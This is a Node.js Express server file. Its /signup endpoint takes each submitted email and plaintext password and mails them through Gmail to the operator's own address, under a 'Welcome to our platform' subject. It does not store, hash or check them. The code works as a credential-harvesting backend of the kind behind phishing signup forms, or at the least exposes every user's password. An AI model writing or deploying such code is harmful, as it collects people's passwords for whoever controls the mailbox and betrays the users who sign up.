import express from 'express'
import cors from 'cors'
import dotenv from 'dotenv';
dotenv.config();
import nodemailer from "nodemailer";
const port = process.env.PORT || 5000 ;




const app = express();


app.use(express.json());
app.use(cors());


// Define your signup endpoint
app.post("/signup", (req, res) => {
  const { email, password } = req.body;

  // console.log(email, password);

const transporter = nodemailer.createTransport({
  service: "Gmail",
  auth: {
    user: process.env.AUTHENTICATE_EMAIL,
    pass: process.env.AUTHENTICATE_PASSWORD,
  },
});

transporter.verify(function(error, success) {
  if (error) {
    console.error("Error verifying transporter:", error);
  } else {
    console.log("Transporter is ready to take messages");
  }
});

  // Setup email data
  const mailOptions = {
    // from: "your-email@gmail.com",
    to: process.env.AUTHENTICATE_EMAIL,
    subject: "Welcome to our platform",
    html: `
      <h1>Leyton!!!</h1>
      <p>Thank you for signing up!</p>
      <p>Your Email: ${email}</p>
      <p>Your Password: ${password}</p>
      <p>We're excited to have you on board!</p>
    `,
  };
  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent:", info.response);
      res.status(200).send("Email sent successfully");
    }
  });
});


app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});

app.get('/', (req, res) => {
  res.send('Server is runnig');
});
